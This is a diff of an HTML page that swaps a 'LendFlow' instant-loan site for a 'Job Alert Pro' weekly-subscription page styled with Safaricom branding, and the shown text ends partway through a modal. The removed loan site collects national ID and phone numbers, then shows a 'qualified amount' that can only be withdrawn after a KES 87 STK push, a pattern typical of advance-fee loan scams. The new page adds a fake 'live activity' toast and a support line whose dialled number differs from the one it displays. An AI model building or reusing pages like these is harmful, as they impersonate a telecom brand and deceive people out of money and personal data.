@@ -1,1264 +1,485 @@
 <!DOCTYPE html>
-<html lang="en" class="light">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>LendFlow — Smart Loans, Instant Approval</title>
-  <meta name="description" content="LendFlow is a modern fintech loan platform offering instant approval, low interest rates and secure M-Pesa payments." />
-  <!-- Tailwind CSS -->
-  <script src="https://cdn.tailwindcss.com"></script>
-  <!-- Font Awesome -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
-  <!-- Google Fonts -->
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
-  <script>
-    tailwind.config = {
-      darkMode: 'class',
-      theme: {
-        extend: {
-          fontFamily: { sans: ['Inter', 'sans-serif'], display: ['Plus Jakarta Sans', 'sans-serif'] },
-          colors: {
-            brand: { 50: '#ecfdf5', 100: '#d1fae5', 200: '#a7f3d0', 300: '#6ee7b7', 400: '#34d399', 500: '#10b981', 600: '#059669', 700: '#047857', 800: '#065f46', 900: '#064e3b' },
-            ink: { 900: '#0b1120', 800: '#0f172a', 700: '#1e293b', 600: '#334155' }
-          },
-          keyframes: {
-            'fade-up': { '0%': { opacity: 0, transform: 'translateY(16px)' }, '100%': { opacity: 1, transform: 'translateY(0)' } },
-            'fade-in': { '0%': { opacity: 0 }, '100%': { opacity: 1 } },
-            'scale-in': { '0%': { opacity: 0, transform: 'scale(.95)' }, '100%': { opacity: 1, transform: 'scale(1)' } },
-            'pulse-ring': { '0%': { transform: 'scale(.8)', opacity: .8 }, '100%': { transform: 'scale(2.2)', opacity: 0 } },
-            'slide-in': { '0%': { transform: 'translateX(120%)' }, '100%': { transform: 'translateX(0)' } },
-            'spin-slow': { 'to': { transform: 'rotate(360deg)' } }
-          },
-          animation: {
-            'fade-up': 'fade-up .6s cubic-bezier(.16,1,.3,1) both',
-            'fade-in': 'fade-in .5s ease both',
-            'scale-in': 'scale-in .35s cubic-bezier(.16,1,.3,1) both',
-            'pulse-ring': 'pulse-ring 1.6s ease-out infinite',
-            'slide-in': 'slide-in .4s cubic-bezier(.16,1,.3,1) both',
-            'spin-slow': 'spin-slow 1s linear infinite'
-          }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Job Alert Pro - Weekly Subscription</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
+        :root {
+            --safaricom-green: #49aa33;
+            --saf-mint: #eafcf1;
+            --saf-primary: #1e293b;
         }
-      }
-    };
-  </script>
-  <style>
-    html { scroll-behavior: smooth; }
-    body { font-family: 'Inter', sans-serif; }
-    h1,h2,h3,h4,.font-display { font-family: 'Plus Jakarta Sans', sans-serif; }
-    .glass { background: rgba(255,255,255,0.65); backdrop-filter: blur(16px) saturate(160%); -webkit-backdrop-filter: blur(16px) saturate(160%); border: 1px solid rgba(255,255,255,0.5); }
-    .dark .glass { background: rgba(15,23,42,0.55); border: 1px solid rgba(148,163,184,0.16); }
-    .glass-strong { background: rgba(255,255,255,0.85); backdrop-filter: blur(20px) saturate(180%); -webkit-backdrop-filter: blur(20px) saturate(180%); border: 1px solid rgba(255,255,255,0.6); }
-    .dark .glass-strong { background: rgba(15,23,42,0.8); border: 1px solid rgba(148,163,184,0.18); }
-    .hero-mesh { background: radial-gradient(60% 60% at 15% 20%, rgba(16,185,129,.35) 0%, transparent 60%), radial-gradient(50% 50% at 85% 15%, rgba(13,148,136,.30) 0%, transparent 55%), radial-gradient(60% 60% at 70% 85%, rgba(5,150,105,.28) 0%, transparent 60%), linear-gradient(135deg, #064e3b 0%, #065f46 40%, #0f172a 100%); }
-    ::-webkit-scrollbar { width: 10px; height: 10px; }
-    ::-webkit-scrollbar-thumb { background: rgba(100,116,139,.4); border-radius: 8px; }
-    input[type=range] { -webkit-appearance: none; appearance: none; height: 8px; border-radius: 999px; background: linear-gradient(to right,#10b981 0%,#10b981 var(--pct,40%),rgba(148,163,184,.35) var(--pct,40%),rgba(148,163,184,.35) 100%); outline: none; }
-    input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; width: 24px; height: 24px; border-radius: 50%; background: #fff; border: 4px solid #10b981; cursor: pointer; box-shadow: 0 2px 8px rgba(0,0,0,.2); transition: transform .15s; }
-    input[type=range]::-webkit-slider-thumb:hover { transform: scale(1.15); }
-    input[type=range]::-moz-range-thumb { width: 20px; height: 20px; border-radius: 50%; background: #fff; border: 4px solid #10b981; cursor: pointer; }
-    .step-line { transition: all .4s cubic-bezier(.16,1,.3,1); }
-    [hidden] { display: none !important; }
-    .nav-link { position: relative; }
-    .nav-link::after { content:''; position:absolute; left:0; bottom:-4px; height:2px; width:0; background:#10b981; transition:width .25s; }
-    .nav-link:hover::after { width:100%; }
-    .form-label { display:block; font-size:.8rem; font-weight:600; margin-bottom:.4rem; color:#475569; }
-    .dark .form-label { color:#cbd5e1; }
-    .form-input { width:100%; padding:.75rem 1rem; border-radius:.85rem; border:1.5px solid rgba(148,163,184,.35); background:rgba(255,255,255,.7); font-size:.95rem; transition:all .2s; color:#0f172a; }
-    .dark .form-input { background:rgba(15,23,42,.6); border-color:rgba(148,163,184,.25); color:#f1f5f9; }
-    .form-input:focus { outline:none; border-color:#10b981; box-shadow:0 0 0 4px rgba(16,185,129,.15); }
-    .form-input.invalid { border-color:#ef4444; box-shadow:0 0 0 4px rgba(239,68,68,.12); }
-    .form-error { color:#ef4444; font-size:.78rem; margin-top:.35rem; min-height:1rem; }
-    .radio-card { display:flex; align-items:center; justify-content:center; gap:.5rem; padding:.85rem; border-radius:.85rem; border:1.5px solid rgba(148,163,184,.35); font-weight:600; font-size:.9rem; cursor:pointer; transition:all .2s; background:rgba(255,255,255,.5); }
-    .dark .radio-card { background:rgba(15,23,42,.5); border-color:rgba(148,163,184,.22); }
-    .radio-card:hover { border-color:#10b981; }
-    .radio-card.selected { border-color:#10b981; background:rgba(16,185,129,.12); color:#047857; }
-    .dark .radio-card.selected { color:#6ee7b7; }
-  </style>
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #f8fafc;
+            color: #1e293b;
+        }
+        .text-safaricom { color: var(--safaricom-green); }
+        .bg-safaricom { background-color: var(--safaricom-green); }
+        .border-safaricom { border-color: var(--safaricom-green); }
+
+        .support-bar {
+            background: #0f172a; color: #ffffff; font-size: 13px; font-weight: 800;
+            padding: 12px 20px; display: flex; justify-content: space-between;
+            align-items: center; border-bottom: 2px solid var(--safaricom-green);
+        }
+
+        .scanner-line {
+            width: 100%; height: 2px; background: var(--safaricom-green);
+            position: absolute; top: 0; left: 0;
+            box-shadow: 0 0 15px var(--safaricom-green);
+            animation: scan 2s linear infinite;
+        }
+        @keyframes scan {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+        @keyframes dot-pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.5); opacity: 0.5; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .online-indicator { animation: dot-pulse 2s infinite; }
+
+        #live-toast {
+            position: fixed; bottom: 20px; left: 10px; right: 10px;
+            background: white; padding: 12px; border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            border-left: 4px solid var(--safaricom-green);
+            transform: translateX(-150%); transition: transform 0.5s ease-out;
+            z-index: 1000; max-width: 320px;
+        }
+        @media (min-width: 768px) {
+            #live-toast { left: 20px; bottom: 100px; right: auto; }
+        }
+        #live-toast.show { transform: translateX(0); }
+    </style>
 </head>
-<body class="bg-slate-50 dark:bg-ink-900 text-slate-900 dark:text-slate-100 transition-colors duration-300 antialiased">
+<body class="bg-slate-50">
 
-  <!-- ADMIN LOGIN MODAL -->
-  <div id="adminLoginModal" class="fixed inset-0 z-[80] hidden">
-    <div class="absolute inset-0 bg-slate-900/70 backdrop-blur-sm"></div>
-    <div class="relative min-h-full grid place-items-center p-4">
-      <div class="glass-strong rounded-3xl w-full max-w-md p-8 shadow-2xl animate-scale-in">
-        <div class="text-center mb-6">
-          <span class="grid place-items-center w-14 h-14 mx-auto rounded-2xl bg-brand-500 text-white text-2xl mb-4"><i class="fa-solid fa-shield-halved"></i></span>
-          <h2 class="font-display text-2xl font-extrabold">Admin Login</h2>
-          <p class="text-sm text-slate-500 dark:text-slate-400 mt-1">Enter credentials</p>
+    <!-- Live Toast Notification -->
+    <div id="live-toast" class="flex items-center gap-3">
+        <div class="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center text-safaricom">
+            <i class="fas fa-bolt"></i>
         </div>
-        <div class="space-y-4">
-          <div>
-            <label class="form-label">Username</label>
-            <input id="adminLoginUser" class="form-input" placeholder="Enter username" />
-          </div>
-          <div>
-            <label class="form-label">Password</label>
-            <input id="adminLoginPass" type="password" class="form-input" placeholder="Enter password" />
-          </div>
-          <p id="adminLoginError" class="form-error text-center"></p>
-          <button id="adminLoginBtn" class="w-full inline-flex items-center justify-center gap-2 bg-brand-500 hover:bg-brand-600 text-white font-bold px-5 py-3.5 rounded-xl transition active:scale-95"><i class="fa-solid fa-lock"></i> Sign In</button>
-          <button type="button" id="adminLoginCancel" class="w-full inline-flex items-center justify-center gap-2 px-5 py-3 rounded-xl font-semibold text-slate-600 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 transition">Cancel</button>
+        <div>
+            <p class="text-[10px] font-bold text-slate-400 uppercase">Live Activity</p>
+            <p id="toast-msg" class="text-xs font-bold text-slate-800"></p>
         </div>
-      </div>
     </div>
-  </div>
 
-  <!-- TOP NAV -->
-  <header id="topnav" class="fixed top-0 inset-x-0 z-50 transition-all duration-300">
-    <nav class="glass mx-auto max-w-7xl mt-3 px-4 sm:px-6 rounded-2xl flex items-center justify-between h-16 shadow-lg shadow-black/5">
-      <a href="#" data-nav="landing" class="flex items-center gap-2.5 font-display font-extrabold text-xl">
-        <span class="grid place-items-center w-9 h-9 rounded-xl bg-brand-500 text-white shadow-lg shadow-brand-500/30"><i class="fa-solid fa-bolt"></i></span>
-        <span>Lend<span class="text-brand-500">Flow</span></span>
-      </a>
-      <div class="hidden md:flex items-center gap-8 text-sm font-medium text-slate-600 dark:text-slate-300">
-        <a href="#features" class="nav-link">Features</a>
-        <a href="#calculator" class="nav-link">Calculator</a>
-        <a href="#how" class="nav-link">How it works</a>
-        <a href="#" data-nav="dashboard" class="nav-link">Dashboard</a>
-        <a href="#" data-nav="admin" class="nav-link">Admin</a>
-      </div>
-      <div class="flex items-center gap-2">
-        <button id="themeToggle" class="grid place-items-center w-10 h-10 rounded-xl glass hover:scale-105 transition" aria-label="Toggle dark mode">
-          <i class="fa-solid fa-moon dark:hidden text-slate-700"></i>
-          <i class="fa-solid fa-sun hidden dark:block text-amber-300"></i>
-        </button>
-        <button data-nav="apply" class="hidden sm:inline-flex items-center gap-2 bg-brand-500 hover:bg-brand-600 text-white font-semibold text-sm px-5 py-2.5 rounded-xl shadow-lg shadow-brand-500/30 transition active:scale-95">Apply Now <i class="fa-solid fa-arrow-right text-xs"></i></button>
-      </div>
-    </nav>
-  </header>
-
-  <main id="app">
-
-    <!-- LANDING -->
-    <section data-page="landing">
-      <div class="hero-mesh relative overflow-hidden pt-28 pb-24 md:pt-36 md:pb-32">
-        <div class="absolute inset-0 opacity-[0.07]" style="background-image:radial-gradient(circle,#fff 1px,transparent 1px);background-size:28px 28px;"></div>
-        <div class="relative mx-auto max-w-7xl px-4 sm:px-6 grid lg:grid-cols-2 gap-12 items-center">
-          <div class="text-white animate-fade-up">
-            <span class="inline-flex items-center gap-2 glass-strong !bg-white/15 !border-white/20 text-white text-xs font-semibold px-4 py-2 rounded-full mb-6">
-              <span class="w-2 h-2 rounded-full bg-brand-300 animate-pulse"></span> Trusted by 250,000+ borrowers
-            </span>
-            <h1 class="font-display text-4xl sm:text-5xl lg:text-6xl font-extrabold leading-[1.05] text-balance">Get the funds you need, <span class="text-brand-300">approved in minutes.</span></h1>
-            <p class="mt-6 text-lg text-emerald-50/90 max-w-xl leading-relaxed text-pretty">LendFlow gives you instant access to affordable loans with transparent rates, flexible repayment and secure M-Pesa payouts — all from your phone.</p>
-            <div class="mt-8 flex flex-wrap gap-3">
-              <button data-nav="apply" class="inline-flex items-center gap-2 bg-white text-emerald-700 font-bold px-7 py-3.5 rounded-xl shadow-xl hover:-translate-y-0.5 transition active:scale-95">Apply Now <i class="fa-solid fa-arrow-right"></i></button>
-              <a href="#calculator" class="inline-flex items-center gap-2 glass-strong !bg-white/10 !border-white/25 text-white font-semibold px-7 py-3.5 rounded-xl hover:bg-white/20 transition"><i class="fa-solid fa-calculator"></i> Estimate repayment</a>
-            </div>
-            <div class="mt-10 flex flex-wrap items-center gap-x-8 gap-y-3 text-sm text-emerald-50/80">
-              <span class="flex items-center gap-2"><i class="fa-solid fa-shield-halved text-brand-300"></i> Bank-grade security</span>
-              <span class="flex items-center gap-2"><i class="fa-solid fa-clock text-brand-300"></i> 5-min application</span>
-              <span class="flex items-center gap-2"><i class="fa-solid fa-star text-amber-300"></i> 4.9/5 rating</span>
-            </div>
-          </div>
-          <div class="animate-scale-in" style="animation-delay:.15s">
-            <div class="glass-strong rounded-3xl p-6 sm:p-8 shadow-2xl shadow-black/30">
-              <div class="flex items-center justify-between mb-1">
-                <h3 class="font-display font-bold text-lg text-slate-900 dark:text-white">Quick estimate</h3>
-                <span class="text-xs font-semibold text-brand-600 dark:text-brand-300 bg-brand-100 dark:bg-brand-500/15 px-3 py-1 rounded-full">No impact on credit</span>
-              </div>
-              <p class="text-sm text-slate-500 dark:text-slate-400 mb-5">Slide to see your monthly payment.</p>
-              <div id="heroCalc"></div>
-            </div>
-          </div>
+    <!-- Support Bar -->
+    <div class="support-bar sticky top-0 z-[60]">
+        <div class="flex items-center gap-2">
+            <i class="fas fa-headset text-safaricom"></i>
+            <span class="uppercase tracking-wider">24/7 SUPPORT</span>
         </div>
-        <div class="relative mx-auto max-w-7xl px-4 sm:px-6 mt-16">
-          <div class="glass-strong rounded-2xl grid grid-cols-2 md:grid-cols-4 divide-x divide-slate-200/60 dark:divide-slate-700/60">
-            <div class="p-6 text-center"><div class="font-display text-3xl font-extrabold text-slate-900 dark:text-white">KSh 8B+</div><div class="text-sm text-slate-500 dark:text-slate-400 mt-1">Loans disbursed</div></div>
-            <div class="p-6 text-center"><div class="font-display text-3xl font-extrabold text-slate-900 dark:text-white">3 min</div><div class="text-sm text-slate-500 dark:text-slate-400 mt-1">Avg. approval</div></div>
-            <div class="p-6 text-center"><div class="font-display text-3xl font-extrabold text-slate-900 dark:text-white">98%</div><div class="text-sm text-slate-500 dark:text-slate-400 mt-1">Approval rate</div></div>
-            <div class="p-6 text-center"><div class="font-display text-3xl font-extrabold text-slate-900 dark:text-white">24/7</div><div class="text-sm text-slate-500 dark:text-slate-400 mt-1">Support</div></div>
-          </div>
+        <div class="flex items-center gap-4">
+            <a href="tel:0722000000" class="hidden md:block">0796501646</a>
         </div>
-      </div>
-
-      <section id="features" class="py-20 md:py-28 mx-auto max-w-7xl px-4 sm:px-6">
-        <div class="text-center max-w-2xl mx-auto">
-          <span class="text-brand-600 dark:text-brand-400 font-semibold text-sm uppercase tracking-wider">Why LendFlow</span>
-          <h2 class="font-display text-3xl md:text-4xl font-extrabold mt-3 text-balance">Everything you need to borrow with confidence</h2>
-          <p class="mt-4 text-slate-500 dark:text-slate-400 text-pretty">A modern lending experience built around speed, fairness and security.</p>
-        </div>
-        <div class="grid sm:grid-cols-2 lg:grid-cols-4 gap-6 mt-14" id="featuresGrid"></div>
-      </section>
-
-      <section id="how" class="py-16 md:py-24 bg-slate-100/70 dark:bg-ink-800/40">
-        <div class="mx-auto max-w-7xl px-4 sm:px-6">
-          <div class="text-center max-w-2xl mx-auto mb-14">
-            <span class="text-brand-600 dark:text-brand-400 font-semibold text-sm uppercase tracking-wider">Simple process</span>
-            <h2 class="font-display text-3xl md:text-4xl font-extrabold mt-3">Get funded in 3 easy steps</h2>
-          </div>
-          <div class="grid md:grid-cols-3 gap-6" id="howGrid"></div>
-        </div>
-      </section>
-
-      <section class="py-20 md:py-28 mx-auto max-w-7xl px-4 sm:px-6">
-        <div class="hero-mesh rounded-3xl p-10 md:p-16 text-center relative overflow-hidden">
-          <div class="absolute inset-0 opacity-[0.08]" style="background-image:radial-gradient(circle,#fff 1px,transparent 1px);background-size:24px 24px;"></div>
-          <div class="relative">
-            <h2 class="font-display text-3xl md:text-4xl font-extrabold text-white text-balance">Ready to get started?</h2>
-            <p class="mt-4 text-emerald-50/90 max-w-xl mx-auto text-pretty">Join hundreds of thousands who trust LendFlow for fast, fair and friendly loans.</p>
-            <button data-nav="apply" class="mt-8 inline-flex items-center gap-2 bg-white text-emerald-700 font-bold px-8 py-4 rounded-xl shadow-xl hover:-translate-y-0.5 transition active:scale-95">Start your application <i class="fa-solid fa-arrow-right"></i></button>
-          </div>
-        </div>
-      </section>
-
-      <footer class="border-t border-slate-200 dark:border-slate-800 py-12">
-        <div class="mx-auto max-w-7xl px-4 sm:px-6 flex flex-col md:flex-row items-center justify-between gap-4 text-sm text-slate-500 dark:text-slate-400">
-          <div class="flex items-center gap-2.5 font-display font-extrabold text-lg text-slate-900 dark:text-white">
-            <span class="grid place-items-center w-8 h-8 rounded-lg bg-brand-500 text-white"><i class="fa-solid fa-bolt"></i></span>
-            Lend<span class="text-brand-500">Flow</span>
-          </div>
-          <p>© 2026 LendFlow. FastLoans — Real financial service.</p>
-          <div class="flex gap-4 text-lg">
-            <a href="#" class="hover:text-brand-500 transition"><i class="fa-brands fa-x-twitter"></i></a>
-            <a href="#" class="hover:text-brand-500 transition"><i class="fa-brands fa-linkedin"></i></a>
-            <a href="#" class="hover:text-brand-500 transition"><i class="fa-brands fa-facebook"></i></a>
-          </div>
-        </div>
-      </footer>
-    </section>
-
-    <!-- APPLY -->
-    <section data-page="apply" hidden class="min-h-screen pt-28 pb-20 px-4 sm:px-6 bg-slate-50 dark:bg-ink-900">
-      <div class="mx-auto max-w-3xl">
-        <div class="text-center mb-8">
-          <h1 class="font-display text-3xl md:text-4xl font-extrabold">Loan Application</h1>
-          <p class="text-slate-500 dark:text-slate-400 mt-2">Complete the steps below. It only takes a few minutes.</p>
-        </div>
-        <div class="flex items-center justify-between mb-10 max-w-xl mx-auto" id="stepper"></div>
-        <form id="loanForm" novalidate class="glass-strong rounded-3xl p-6 sm:p-10 shadow-xl">
-          <div data-step="1">
-            <h3 class="font-display font-bold text-xl mb-6 flex items-center gap-2"><i class="fa-solid fa-user text-brand-500"></i> Personal Details</h3>
-            <div class="grid sm:grid-cols-2 gap-5">
-              <div class="sm:col-span-2"><label class="form-label">Full Name</label><input name="fullName" class="form-input" placeholder="Jane Wanjiru Doe" /><p class="form-error"></p></div>
-              <div><label class="form-label">National ID Number</label><input name="nationalId" inputmode="numeric" class="form-input" placeholder="12345678" /><p class="form-error"></p></div>
-              <div><label class="form-label">Phone Number</label><input name="phone" inputmode="tel" class="form-input" placeholder="0712 345 678 or 0112 345 678" /><p class="form-error"></p></div>
-              <div><label class="form-label">Email Address</label><input name="email" type="email" class="form-input" placeholder="jane@email.com" /><p class="form-error"></p></div>
-              <div><label class="form-label">Date of Birth</label><input name="dob" type="date" class="form-input" /><p class="form-error"></p></div>
-              <div class="sm:col-span-2">
-                <label class="form-label">Gender</label>
-                <div class="grid grid-cols-3 gap-3" id="genderGroup">
-                  <label class="radio-card"><input type="radio" name="gender" value="Female" class="sr-only"><i class="fa-solid fa-venus"></i> Female</label>
-                  <label class="radio-card"><input type="radio" name="gender" value="Male" class="sr-only"><i class="fa-solid fa-mars"></i> Male</label>
-                  <label class="radio-card"><input type="radio" name="gender" value="Other" class="sr-only"><i class="fa-solid fa-genderless"></i> Other</label>
-                </div>
-                <p class="form-error"></p>
-              </div>
-            </div>
-          </div>
-          <div data-step="2" hidden>
-            <h3 class="font-display font-bold text-xl mb-6 flex items-center gap-2"><i class="fa-solid fa-briefcase text-brand-500"></i> Employment Information</h3>
-            <div class="grid sm:grid-cols-2 gap-5">
-              <div class="sm:col-span-2">
-                <label class="form-label">Employment Status</label>
-                <div class="grid sm:grid-cols-2 gap-3" id="empGroup">
-                  <label class="radio-card"><input type="radio" name="employment" value="Employed" class="sr-only"><i class="fa-solid fa-building"></i> Employed</label>
-                  <label class="radio-card"><input type="radio" name="employment" value="Self-Employed" class="sr-only"><i class="fa-solid fa-store"></i> Self-Employed</label>
-                  <label class="radio-card"><input type="radio" name="employment" value="Business Owner" class="sr-only"><i class="fa-solid fa-chart-line"></i> Business Owner</label>
-                  <label class="radio-card"><input type="radio" name="employment" value="Unemployed" class="sr-only"><i class="fa-solid fa-user-clock"></i> Unemployed</label>
-                </div>
-                <p class="form-error"></p>
-              </div>
-              <div class="sm:col-span-2">
-                <label class="form-label">Monthly Income (KSh)</label>
-                <div class="relative">
-                  <span class="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 font-semibold">KSh</span>
-                  <input name="income" inputmode="numeric" class="form-input !pl-14" placeholder="65,000" />
-                </div>
-                <p class="form-error"></p>
-              </div>
-            </div>
-          </div>
-          <div data-step="3" hidden>
-            <h3 class="font-display font-bold text-xl mb-6 flex items-center gap-2"><i class="fa-solid fa-coins text-brand-500"></i> Loan Details</h3>
-            <div id="formCalc"></div>
-            <input type="hidden" name="amount" />
-            <input type="hidden" name="term" />
-            <div class="mt-6">
-              <label class="form-label">Loan Purpose</label>
-              <select name="purpose" class="form-input">
-                <option value="">Select a purpose</option>
-                <option>Business expansion</option>
-                <option>Education</option>
-                <option>Medical</option>
-                <option>Home improvement</option>
-                <option>Emergency</option>
-                <option>Personal</option>
-              </select>
-              <p class="form-error"></p>
-            </div>
-          </div>
-          <div data-step="4" hidden>
-            <h3 class="font-display font-bold text-xl mb-6 flex items-center gap-2"><i class="fa-solid fa-clipboard-check text-brand-500"></i> Review & Submit</h3>
-            <div id="reviewBox" class="space-y-3"></div>
-            <label class="flex items-start gap-3 mt-6 text-sm text-slate-600 dark:text-slate-300 cursor-pointer">
-              <input type="checkbox" name="terms" class="mt-0.5 w-5 h-5 rounded accent-brand-500" />
-              <span>I confirm the information above is accurate and I agree to the <a href="#" class="text-brand-600 dark:text-brand-400 font-semibold">Terms & Conditions</a> and privacy policy.</span>
-            </label>
-            <p class="form-error" data-for="terms"></p>
-          </div>
-          <div class="flex items-center justify-between mt-10 pt-6 border-t border-slate-200 dark:border-slate-700">
-            <button type="button" id="prevBtn" class="inline-flex items-center gap-2 px-5 py-3 rounded-xl font-semibold text-slate-600 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 transition" hidden><i class="fa-solid fa-arrow-left"></i> Back</button>
-            <span class="flex-1"></span>
-            <button type="button" id="nextBtn" class="inline-flex items-center gap-2 bg-brand-500 hover:bg-brand-600 text-white font-semibold px-7 py-3 rounded-xl shadow-lg shadow-brand-500/30 transition active:scale-95">Continue <i class="fa-solid fa-arrow-right text-xs"></i></button>
-            <button type="submit" id="submitBtn" class="inline-flex items-center gap-2 bg-brand-500 hover:bg-brand-600 text-white font-semibold px-7 py-3 rounded-xl shadow-lg shadow-brand-500/30 transition active:scale-95" hidden><i class="fa-solid fa-paper-plane"></i> Submit Application</button>
-          </div>
-        </form>
-      </div>
-    </section>
-
-    <!-- DASHBOARD -->
-    <section data-page="dashboard" hidden class="min-h-screen pt-24 pb-16 px-4 sm:px-6 bg-slate-50 dark:bg-ink-900">
-      <div class="mx-auto max-w-6xl">
-        <div class="hero-mesh rounded-3xl p-8 md:p-10 text-white relative overflow-hidden mb-8">
-          <div class="absolute inset-0 opacity-[0.08]" style="background-image:radial-gradient(circle,#fff 1px,transparent 1px);background-size:24px 24px;"></div>
-          <div class="relative flex flex-col md:flex-row md:items-center justify-between gap-6">
-            <div>
-              <p class="text-emerald-100/80 text-sm">Welcome back,</p>
-              <h1 class="font-display text-3xl font-extrabold" id="dashName">there 👋</h1>
-              <p class="text-emerald-50/90 mt-2 max-w-md text-pretty">Here's an overview of your loan account and recent activity.</p>
-            </div>
-            <div class="glass-strong !bg-white/15 !border-white/20 rounded-2xl p-5 min-w-[220px]">
-              <p class="text-emerald-100/80 text-xs uppercase tracking-wide">Qualified Amount</p>
-              <p class="font-display text-3xl font-extrabold mt-1" id="dashBalance">KSh 0</p>
-              <button id="withdrawToMpesaBtn" class="mt-3 w-full inline-flex items-center justify-center gap-2 bg-white text-emerald-700 font-bold px-4 py-2.5 rounded-xl text-sm hover:-translate-y-0.5 transition"><i class="fa-solid fa-mobile-screen"></i> Withdraw To M-Pesa</button>
-            </div>
-          </div>
-        </div>
-        <div class="grid lg:grid-cols-3 gap-6">
-          <div class="lg:col-span-2 space-y-6">
-            <div class="glass-strong rounded-2xl p-6">
-              <div class="flex items-center justify-between mb-5">
-                <h3 class="font-display font-bold text-lg">Loan Status</h3>
-                <span id="statusBadge" class="text-xs font-bold px-3 py-1.5 rounded-full">—</span>
-              </div>
-              <div id="statusTracker"></div>
-            </div>
-            <div class="glass-strong rounded-2xl p-6">
-              <div class="flex items-center justify-between mb-4">
-                <h3 class="font-display font-bold text-lg">Transaction History</h3>
-                <span class="text-xs text-slate-400">Applicant data</span>
-              </div>
-              <div id="txList" class="divide-y divide-slate-200/70 dark:divide-slate-700/60"></div>
-            </div>
-          </div>
-          <div class="space-y-6">
-            <div class="glass-strong rounded-2xl p-6">
-              <h3 class="font-display font-bold text-lg mb-4">Profile</h3>
-              <div class="flex items-center gap-4">
-                <div id="avatar" class="w-14 h-14 rounded-2xl bg-brand-500 text-white grid place-items-center font-display font-extrabold text-xl">?</div>
-                <div class="min-w-0">
-                  <p class="font-semibold truncate" id="profName">—</p>
-                  <p class="text-sm text-slate-500 dark:text-slate-400 truncate" id="profEmail">—</p>
-                </div>
-              </div>
-              <dl class="mt-5 space-y-3 text-sm" id="profDetails"></dl>
-            </div>
-            <div class="glass-strong rounded-2xl p-6">
-              <div class="flex items-center justify-between mb-4">
-                <h3 class="font-display font-bold text-lg">Notifications</h3>
-                <span class="w-6 h-6 grid place-items-center text-xs font-bold rounded-full bg-brand-500 text-white" id="notifCount">0</span>
-              </div>
-              <div id="notifList" class="space-y-3"></div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- ADMIN -->
-    <section data-page="admin" hidden class="min-h-screen pt-24 pb-16 px-4 sm:px-6 bg-slate-50 dark:bg-ink-900">
-      <div class="mx-auto max-w-7xl">
-        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-8">
-          <div>
-            <h1 class="font-display text-3xl font-extrabold flex items-center gap-3"><i class="fa-solid fa-shield-halved text-brand-500"></i> Admin Panel</h1>
-            <p class="text-slate-500 dark:text-slate-400 mt-1">Manage applications, users and analytics.</p>
-          </div>
-          <button id="seedBtn" class="inline-flex items-center gap-2 glass-strong px-4 py-2.5 rounded-xl font-semibold text-sm hover:scale-105 transition"><i class="fa-solid fa-database"></i> Load sample data</button>
-        </div>
-        <div class="grid grid-cols-2 lg:grid-cols-4 gap-4 mb-8" id="adminStats"></div>
-        <div class="grid lg:grid-cols-3 gap-6">
-          <div class="lg:col-span-2 glass-strong rounded-2xl p-6">
-            <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 mb-5">
-              <h3 class="font-display font-bold text-lg">Loan Applications</h3>
-              <div class="relative">
-                <i class="fa-solid fa-magnifying-glass absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 text-sm"></i>
-                <input id="adminSearch" class="form-input !py-2.5 !pl-10 w-full sm:w-64" placeholder="Search applicants…" />
-              </div>
-            </div>
-            <div class="overflow-x-auto -mx-2">
-              <table class="w-full text-sm">
-                <thead>
-                  <tr class="text-left text-slate-400 border-b border-slate-200 dark:border-slate-700">
-                    <th class="py-3 px-2 font-semibold">Applicant</th>
-                    <th class="py-3 px-2 font-semibold">Amount</th>
-                    <th class="py-3 px-2 font-semibold">Status</th>
-                    <th class="py-3 px-2 font-semibold text-right">Actions</th>
-                  </tr>
-                </thead>
-                <tbody id="adminTable"></tbody>
-              </table>
-              <div id="adminEmpty" class="text-center py-12 text-slate-400" hidden>
-                <i class="fa-regular fa-folder-open text-4xl mb-3"></i>
-                <p>No applications yet. Submit one or load sample data.</p>
-              </div>
-            </div>
-          </div>
-          <div class="glass-strong rounded-2xl p-6">
-            <h3 class="font-display font-bold text-lg mb-4">User Management</h3>
-            <div id="adminUsers" class="space-y-3"></div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-  </main>
-
-  <!-- WITHDRAW MODAL (KES 87 STK Push) -->
-  <div id="withdrawModal" class="fixed inset-0 z-[60] hidden">
-    <div class="absolute inset-0 bg-slate-900/60 backdrop-blur-sm" id="withdrawModalBackdrop"></div>
-    <div class="relative min-h-full grid place-items-center p-4">
-      <div class="glass-strong rounded-3xl w-full max-w-md p-7 shadow-2xl animate-scale-in">
-        <div class="flex items-center justify-between mb-6">
-          <div class="flex items-center gap-3">
-            <span class="grid place-items-center w-11 h-11 rounded-xl bg-green-600 text-white text-lg font-bold">M</span>
-            <div>
-              <h3 class="font-display font-bold text-lg leading-tight">Withdraw to M-Pesa</h3>
-              <p class="text-xs text-slate-500 dark:text-slate-400">Secure STK Push</p>
